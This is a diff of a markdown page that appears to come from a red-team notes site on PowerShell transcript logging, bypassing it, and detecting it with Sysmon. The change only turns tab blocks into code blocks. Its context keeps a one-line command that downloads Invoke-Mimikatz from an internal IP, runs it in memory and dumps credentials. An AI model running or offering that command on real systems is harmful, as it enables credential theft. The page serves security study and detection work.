@@ -8,13 +8,11 @@ description: >-
 
 ## Execution
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Hashes and plain text passwords of the compromised system are dumped to the console:
 
@@ -36,13 +34,11 @@ PowerShell transcript logging should allow you to see the commands entered into 
 
 For the first test, I setup transcript logging in my powershell \(version 2.0\) profile:
 
-{% tabs %}
-{% tab title="C:\\Users\\mantvydas\\Documents\\WindowsPowerShell\\Microsoft.PowerShell\_profile.ps1" %}
+{% code title="C:\\Users\\mantvydas\\Documents\\WindowsPowerShell\\Microsoft.PowerShell\_profile.ps1" %}
 ```bash
 Start-Transcript -Path C:\transcript.txt
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 {% hint style="warning" %}
 Note that enabling transcription logging is not recommended from powershell profiles, since `powershell -nop` will easily bypass this defence - best if logging is enabled via GPOs.
@@ -127,15 +123,13 @@ We can then launch the transcript-bypass and use powershell and not worry about 
 
 I wanted to check if I could find any traces of non-powershell.exe processes creating transcript files in the logs, so I updated the sysmon config:
 
-{% tabs %}
-{% tab title="sysmonconfig.xml" %}
+{% code title="sysmonconfig.xml" %}
 ```markup
 <FileCreate onmatch="include">
     <TargetFilename condition="end with">.txt</TargetFilename>
 </FileCreate>
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ...and while I could see powershell.exe creating transcript files:
 
